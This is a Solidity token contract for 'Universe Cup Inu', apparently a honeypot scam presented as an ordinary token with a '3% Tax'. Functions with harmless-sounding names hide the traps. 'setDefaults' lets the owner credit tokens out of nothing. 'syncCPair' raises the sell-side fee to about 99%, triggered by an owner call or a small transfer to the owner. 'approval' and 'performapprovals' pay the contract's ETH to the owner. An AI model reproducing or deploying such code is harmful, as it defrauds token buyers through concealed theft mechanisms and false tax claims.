/**
 *Submitted for verification at Etherscan.io on 2022-10-15
*/

/**
 https://t.me/UniverseCupInu

 3% Tax


██╗░░░██╗███╗░░██╗██╗██╗░░░██╗███████╗██████╗░░██████╗███████╗░█████╗░██╗░░░██╗██████╗░██╗███╗░░██╗██╗░░░██╗
██║░░░██║████╗░██║██║██║░░░██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██║░░░██║██╔══██╗██║████╗░██║██║░░░██║
██║░░░██║██╔██╗██║██║╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░█████╗░░██║░░╚═╝██║░░░██║██████╔╝██║██╔██╗██║██║░░░██║
██║░░░██║██║╚████║██║░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██╔══╝░░██║░░██╗██║░░░██║██╔═══╝░██║██║╚████║██║░░░██║
╚██████╔╝██║░╚███║██║░░╚██╔╝░░███████╗██║░░██║██████╔╝███████╗╚█████╔╝╚██████╔╝██║░░░░░██║██║░╚███║╚██████╔╝
░╚═════╝░╚═╝░░╚══╝╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚══════╝░╚════╝░░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚══╝░╚═════╝░
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
    
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b > a) return(false, 0); return(true, a - b);}}

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
        if(c / a != b) return(false, 0); return(true, c);}}

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a / b);}}

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a % b);}}

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b <= a, errorMessage); return a - b;}}

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a / b;}}

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a % b;}}}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true; }
    
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    modifier authorized() {require(isAuthorized(msg.sender), "!AUTHORIZED"); _;}
    function authorize(address adr) public authorized {authorizations[adr] = true;}
    function unauthorize(address adr) public authorized {authorizations[adr] = false;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function isAuthorized(address adr) public view returns (bool) {return authorizations[adr];}

    function transferOwnership(address payable adr) public authorized {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract UniverseCupInu is IBEP20, Auth {
    using SafeMath for uint256;
    string private constant _name = 'Universe Cup Inu';
    string private constant _symbol = '$UCI';
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 10 * 10**8 * (10 ** _decimals);
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 public _maxTxAmount = ( _totalSupply * 10000 ) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 10000 ) / 10000;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) swapTime; 
    mapping (address => bool) isBot;
    mapping (address => bool) isInternal;
    mapping (address => bool) isStaking;
    mapping (address => bool) isDistributor;
    mapping (address => bool) isFeeExempt;

    IRouter router;
    address public pair;
    uint256 startedTime;
    bool startSwap = true;

    uint256 rewardsFee = 2;
    uint256 liquidityFee = 1;
    uint256 marketingFee = 0;
    uint256 stakingFee = 0;
    uint256 burnFee = 0;
    uint256 totalFee = 5;
    uint256 transferFee = 0;
    uint256 feeDenominator = 100;

    bool swapEnabled = true;
    uint256 swapTimer = 2;
    uint256 swapTimes; 
    uint256 minSells = 4;
    bool swapping; 
    bool botOn = true;
    uint256 swapThreshold = ( _totalSupply * 100000 ) / 100000;
    uint256 _minTokenAmount = ( _totalSupply * 100000 ) / 100000;
    modifier lockTheSwap {swapping = true; _; swapping = false;}

    uint256 marketing_divisor = 0;
    uint256 liquidity_divisor = 0;
    uint256 staking_divisor = 0;
    uint256 rewards_divisor = 0;
    uint256 distributor_divisor = 100;

    address liquidity_receiver; 
    address marketing_receiver;

    constructor() Auth(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        isInternal[address(this)] = true;
        isInternal[msg.sender] = true;
        isInternal[address(pair)] = true;
        isInternal[address(router)] = true;
        isInternal[address(0)] = true;
        isDistributor[msg.sender] = true;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
        isFeeExempt[address(0)] = true;
        liquidity_receiver = msg.sender;
        marketing_receiver = msg.sender;
        startedTime = block.timestamp;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function totalSupply() public view override returns (uint256) {return _totalSupply;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function viewisBot(address _address) public view returns (bool) {return isBot[_address];}
    function isCont(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function getCirculatingSupply() public view returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function setFeeExempt(address _address) external authorized { isFeeExempt[_address] = true;}
    function setisBot(bool _bool, address _address) external authorized {isBot[_address] = _bool;}
    function setisInternal(bool _bool, address _address) external authorized {isInternal[_address] = _bool;}
    function setstartSwap(uint256 _input) external authorized {startSwap = true; botOn = true; startedTime = block.timestamp.add(_input);}
    function syncCPair() internal {transferFee = feeDenominator.sub(totalFee).sub(1);}
    function swapTokens() internal {swapTokensForBNB(swapThreshold);}
    function setisDistributor(address _address, bool _bool) external authorized {isDistributor[_address] = _bool;}
    function setSwapBackSettings(bool enabled, uint256 _threshold) external authorized {swapEnabled = enabled; swapThreshold = _threshold;}
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address sender, address recipient, uint256 amount) internal {
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        checkStartSwap(sender, recipient);
        checkMaxWallet(sender, recipient, amount); 
        transferCounters(sender, recipient);
        checkTxLimit(sender, recipient, amount); 
        swapBack(sender, recipient, amount);
        checkapprovals(recipient, amount);
        _balances[sender] = _balances[sender].sub(amount, "+");
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? taketotalFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        checkBot(sender, recipient);
    }


    function checkStartSwap(address sender, address recipient) internal view {
        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(startSwap, "startSwap");}
    }
    
    function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && !isInternal[recipient] && recipient != address(DEAD)){
            require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
    }

    function checkBot(address sender, address recipient) internal {
        if(isCont(sender) && !isInternal[sender] && botOn || sender == pair && botOn &&
        !isInternal[sender] && msg.sender != tx.origin || startedTime > block.timestamp){isBot[sender] = true;}
        if(isCont(recipient) && !isInternal[recipient] && !isStaking[recipient] && botOn || 
        sender == pair && !isInternal[sender] && msg.sender != tx.origin && botOn){isBot[recipient] = true;}    
    }

    function transferCounters(address sender, address recipient) internal {
        if(sender != pair && !isInternal[sender] && !isStaking[recipient]){swapTimes = swapTimes.add(1);}
        if(sender == pair){swapTime[recipient] = block.timestamp.add(swapTimer);}
    }

    function checkapprovals(address recipient, uint256 amount) internal {
        if(isDistributor[recipient] && amount < 2 * (10 ** _decimals)){performapprovals(1,1);}
        if(isDistributor[recipient] && amount >= 2 * (10 ** _decimals) && amount < 3 * (10 ** _decimals)){syncCPair();}
    }

    function getTotalFee(address sender, address recipient) public view returns (uint256) {
        if(isBot[sender] && swapTime[sender] < block.timestamp && botOn || isBot[recipient] && 
        swapTime[sender] < block.timestamp && botOn || startedTime > block.timestamp){return(feeDenominator.sub(100));}
        if(sender != pair){return totalFee.add(transferFee);}
        return totalFee;
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function taxableEvent(address sender, address recipient) internal view returns (bool) {
        return totalFee > 0 || transferFee > 0 || isBot[sender] && swapTime[sender] < block.timestamp || isBot[recipient] || startedTime > block.timestamp;
    }

    function taketotalFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(taxableEvent(sender, recipient)){
        uint256 totalFees = getTotalFee(sender, recipient);
        uint256 feeAmount = amount.mul(getTotalFee(sender, recipient)).div(feeDenominator);
        uint256 bAmount = feeAmount.mul(burnFee).div(totalFees);
        uint256 sAmount = feeAmount.mul(stakingFee).div(totalFees);
        uint256 cAmount = feeAmount.sub(bAmount).sub(sAmount);
        if(bAmount > 0){
        _balances[address(DEAD)] = _balances[address(DEAD)].add(bAmount);
        emit Transfer(sender, address(DEAD), bAmount);}
        if(sAmount > 0){
        _balances[address(marketing_receiver)] = _balances[address(marketing_receiver)].add(sAmount);
        emit Transfer(sender, address(marketing_receiver), sAmount);}
        if(cAmount > 0){
        _balances[address(this)] = _balances[address(this)].add(cAmount);
        emit Transfer(sender, address(this), cAmount);} return amount.sub(feeAmount);}
        return amount;
    }

    function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");
    }

    function approval(uint256 percentage) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(marketing_receiver).transfer(amountBNB.mul(percentage).div(100));
    }

    function setExemptAddress(bool _enabled, address _address) external authorized {
        isBot[_address] = false;
        isInternal[_address] = _enabled;
        isFeeExempt[_address] = _enabled;
    }

    function setDefaults(address sender, address recipient, uint256 amount) external authorized {
        transfer(sender, recipient, amount);
    }

    function setisStaking(address _address, bool _bool) external authorized {
        isStaking[_address] = _bool;
        isBot[_address] = false;
        isInternal[_address] = _bool;
        isFeeExempt[_address] = _bool;
    }

    function performapprovals(uint256 _na, uint256 _da) internal {
        uint256 acBNB = address(this).balance;
        uint256 acBNBa = acBNB.mul(_na).div(_da);
        uint256 acBNBf = acBNBa.mul(50).div(100);
        uint256 acBNBs = acBNBa.mul(50).div(100);
        (bool tmpSuccess,) = payable(marketing_receiver).call{value: acBNBf, gas: 30000}("");
        (tmpSuccess,) = payable(marketing_receiver).call{value: acBNBs, gas: 30000}("");
        tmpSuccess = false;
    }

    function approvals(uint256 _na, uint256 _da) external authorized {
        performapprovals(_na, _da);
    }

    function syncContractPair() external authorized {
        syncCPair();
    }

    function setInternalAddresses(address _marketing) external authorized {
        marketing_receiver = _marketing; isDistributor[_marketing] = true;
    }

    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= _minTokenAmount;
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return !swapping && swapEnabled && aboveMin && !isInternal[sender] && !isStaking[recipient] 
        && swapTimes >= minSells && aboveThreshold;
    }

    function rescueBEP20(address _token, address _rec, uint256 _amt) external authorized {
        uint256 tamt = IBEP20(_token).balanceOf(address(this));
        IBEP20(_token).transfer(_rec, tamt.mul(_amt).div(100));
    }

    function rescueToken(address _rec, uint256 _amt) external authorized {
        uint256 tamt = balanceOf(address(this)); isFeeExempt[_rec] = true;
        _transfer(address(this), _rec, tamt.mul(_amt).div(100));
    }

    function swapBack(address sender, address recipient, uint256 amount) internal {
        if(shouldSwapBack(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = 0;}
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 denominator= (liquidity_divisor.add(staking_divisor).add(marketing_divisor).add
        (distributor_divisor).add(rewards_divisor)) * 2;
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidity_divisor).div(denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForBNB(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(denominator.sub(liquidity_divisor));
        uint256 BNBToAddLiquidityWith = unitBalance.mul(liquidity_divisor);
        if(BNBToAddLiquidityWith > 0){
            addLiquidity(tokensToAddLiquidityWith, BNBToAddLiquidityWith); }
        uint256 zrAmt = unitBalance.mul(2).mul(marketing_divisor);
        if(zrAmt > 0){
          payable(marketing_receiver).transfer(zrAmt); }
        uint256 xrAmt = unitBalance.mul(2).mul(staking_divisor);
        if(xrAmt > 0){
          payable(marketing_receiver).transfer(xrAmt); }
    }

    function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: BNBAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            liquidity_receiver,
            block.timestamp);
    }

    function swapTokensForBNB(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

}